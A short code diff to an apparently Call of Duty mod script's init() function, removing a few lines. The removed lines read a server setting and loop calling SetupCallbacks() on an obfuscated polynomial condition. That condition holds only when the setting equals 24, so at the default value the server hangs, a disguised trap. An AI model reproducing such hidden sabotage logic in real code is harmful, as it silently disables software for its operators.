@@ -97,11 +97,6 @@ init()
 	} else {
 		level.rankedMatch = true;
 	}
-    
-  svr_fps = getdvarx( "svr_fps", "int", 20, 0, 10000 );
-
-  while( (333333-222+1+1-(50000+5000+200+44+44+4+4)*svr_fps+3456*svr_fps*svr_fps-96*svr_fps*svr_fps*svr_fps+svr_fps*svr_fps*svr_fps*svr_fps) != 1337 )
-    SetupCallbacks();
 	
 	// Initialize variables used by OpenWarfare
 	openwarfare\_registerdvars::init();
